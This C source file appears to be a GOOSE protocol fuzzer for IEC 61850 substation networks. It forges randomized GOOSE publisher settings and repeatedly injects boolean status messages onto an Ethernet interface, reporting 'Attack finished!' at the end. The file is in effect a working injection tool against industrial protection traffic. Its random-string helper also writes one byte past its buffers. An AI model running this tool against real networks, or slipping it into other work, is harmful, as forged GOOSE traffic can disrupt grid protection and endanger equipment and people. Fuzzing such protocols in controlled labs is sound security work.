/*
 * gooseFuzzer.c
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>

#include <time.h>

#include "mms_value.h"
#include "goose_publisher.h"
#include "hal_thread.h"

#define MAX_LEN 128
#define MIN_LEN 1

#define ST_NUM_MAX 10000
#define ST_NUM_MIN 1

#define N_PACKETS 10

void generate_random_string(char *str) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    size_t charset_size = sizeof(charset) - 1;

    size_t length = (rand() % MAX_LEN) + MIN_LEN;

    for (size_t i = 0; i < length; i++) {
        str[i] = charset[rand() % charset_size];
    }

    str[length] = '\0';
}
 
void setUpPublisher(GoosePublisher* publisher, LinkedList* dataSetValues, char* interface) {

    uint16_t id = rand() % 100;
    uint8_t macAddress[6] = { 01, 0x0C, 0xCD, 0x01, 0x00, id };

    CommParameters gooseCommParameters;
    gooseCommParameters.appId = id;
    gooseCommParameters.vlanId = rand() % 4096;
    gooseCommParameters.vlanPriority = 4;
    gooseCommParameters.dstAddress[0] = macAddress[0];
    gooseCommParameters.dstAddress[1] = macAddress[1];
    gooseCommParameters.dstAddress[2] = macAddress[2];
    gooseCommParameters.dstAddress[3] = macAddress[3];
    gooseCommParameters.dstAddress[4] = macAddress[4];
    gooseCommParameters.dstAddress[5] = macAddress[5];

    *publisher = GoosePublisher_create(&gooseCommParameters, interface);

    if (!*publisher)
    {
        printf("Failed to create GOOSE publisher. Reason can be that the Ethernet interface doesn't exist or root permission are required.\n");
        return;
    }

    char gocbRef[MAX_LEN];
    generate_random_string(gocbRef);

    char goID[MAX_LEN];
    generate_random_string(goID);

    char dataSetRef[MAX_LEN];
    generate_random_string(dataSetRef);

    uint32_t stNum = (rand() % ST_NUM_MAX) + ST_NUM_MIN;

    GoosePublisher_setGoCbRef(*publisher, gocbRef);
    GoosePublisher_setGoID(*publisher, goID);
    GoosePublisher_setDataSetRef(*publisher, dataSetRef);
    GoosePublisher_setTimeAllowedToLive(*publisher, rand() % 1000);
    GoosePublisher_setConfRev(*publisher, rand() % 10);
    GoosePublisher_setStNum(*publisher, stNum);

    *dataSetValues = LinkedList_create();
    bool value = rand() % 2;
    LinkedList_add(*dataSetValues, MmsValue_newBoolean(value));
}

void run(GoosePublisher* publisher, LinkedList* dataSetValues)
{
    printf("Injecting %d messages...\n", N_PACKETS);
    int i = 0;
    for (i = 0; i < N_PACKETS; i++) {

    for (int j = 0; j < 5; j++)
    {
            if (GoosePublisher_publish(*publisher, *dataSetValues) == -1)
            {
                printf("Error sending message!\n");
                return;
            }
    }
    GoosePublisher_increaseStNum(*publisher);
    Thread_sleep(1000);
    }
    printf("Attack finished!\n");
}

int main(int argc, char **argv)
{

    if (argc != 3) {
        printf("Usage: %s <N_BATCHES> <GOOSE_interface>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));

    printf("*****************************************\n");
    printf("*                                       *\n");
    printf("*              Goose Fuzzer             *\n");
    printf("*                                       *\n");
    printf("*****************************************\n");

    int16_t n = (int16_t)atoi(argv[1]);
    char* interface = argv[2];

    for (int i = 0; i < n; i++) {
        GoosePublisher* publisher = alloca(sizeof(GoosePublisher));
        LinkedList* dataSetValues = alloca(sizeof(LinkedList));
    
        setUpPublisher(publisher, dataSetValues, interface);
        if (*publisher == NULL) break;
    
        printf("Starting batch %d...\n", i + 1);
        run(publisher, dataSetValues);

        GoosePublisher_destroy(*publisher);
        LinkedList_destroy(*dataSetValues);
    }

    return 0;
}